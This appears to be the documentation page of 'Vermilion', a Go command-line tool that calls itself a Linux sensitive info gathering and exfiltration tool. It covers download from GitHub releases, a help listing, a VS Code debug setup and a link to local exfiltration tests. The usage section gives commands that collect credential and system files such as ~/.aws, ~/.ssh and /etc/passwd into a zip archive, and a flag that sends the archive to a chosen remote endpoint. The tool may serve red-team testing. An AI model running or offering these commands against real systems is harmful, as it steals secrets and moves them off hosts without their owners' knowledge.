# Vermilion Docs


## Installation  

New version of the tool are released via Github.  
You can retrieve the release you want from [*this*](https://github.com/R3DRUN3/vermilion/releases/) page.  
Example via bash (wget):  
```console
wget https://github.com/R3DRUN3/vermilion/releases/download/v0.6.0/vermilion_0.6.0_linux_amd64.tar.gz
tar -xzf vermilion_0.6.0_linux_amd64.tar.gz
chmod +x vermilion
```  

## Usage
In order to see the tool helper run:  
```console
vermilion -h
```  

example output:  
```console
Vermilion - Linux sensitive info gathering and exfiltration tool

Usage:
  vermilion [flags]

Flags:
  -e, --endpoint string   Exfiltration endpoint URL
  -h, --help              help for vermilion
  -n, --noexf             Skip exfiltration and save locally
  -p, --paths string      Comma-separated list of paths to gather sensitive data from
```  

To run the tool with no exfiltration run:  

```console
vermilion --noexf
```  

The previous command produce a local `exdata` folder with a compressed (.zip) archive inside.  
The archive contains all exfiltrated data.  

If you want to only gather files from specific paths, specify the `-p` argument, for example:  
```console
vermilion -p ~/.aws,/etc/passwd,~/.ssh
```  



If you want to specify an endpoint for exfiltration run:  
```console
vermilion -e https://<your-web-endpoint>
```  





## Debug  

You can use [*vscode*](https://code.visualstudio.com/) for debugging.  
this repo already contains the `.vscode/launch.json` file:  

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Debug vermilion with VsCode",
            "type": "go",
            "request": "launch",
            "mode": "debug",
            "program": "${workspaceFolder}/main.go",
            "args": ["--noexf"],
            "env": {},
            "showLog": true,
            "cwd": "${workspaceFolder}"
        }
    ]
}
```  

Just modify this file to accomodate your configuration and launch the debug via vscode.  

## Test Exfiltration  

You can test data exfiltration locally by following [*these instructions*](../tests/exfiltration/README.md).  
  


